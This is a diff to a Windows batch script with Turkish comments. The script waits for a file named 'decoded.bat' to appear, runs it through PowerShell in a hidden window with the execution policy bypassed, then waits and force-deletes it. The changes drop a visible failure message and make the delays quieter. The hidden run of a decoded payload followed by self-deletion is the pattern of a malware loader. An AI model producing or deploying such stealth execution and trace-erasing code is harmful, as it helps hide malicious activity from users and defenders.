@@ -14,18 +14,19 @@ if exist "decoded.bat" (
 )
 set /a trycount+=1
 if %trycount% GEQ 20 (
-    echo decoded.bat olusamadi.
     exit /b
 )
-timeout /t 0.5 >nul
+ping -n 2 127.0.0.1 >nul
 goto waitloop
 
 :runit
-:: gizli çalıştır ve bitmesini bekle
+:: decoded.bat dosyasını gizli çalıştır ve bitmesini bekle
 powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -FilePath 'decoded.bat' -WindowStyle Hidden -Wait"
 
-:: çalıştıktan sonra sil
+:: çalıştıktan sonra 30 saniye bekle
+ping -n 31 127.0.0.1 >nul
+
+:: decoded.bat dosyasını sil
 del /f /q decoded.bat
 
 exit
-
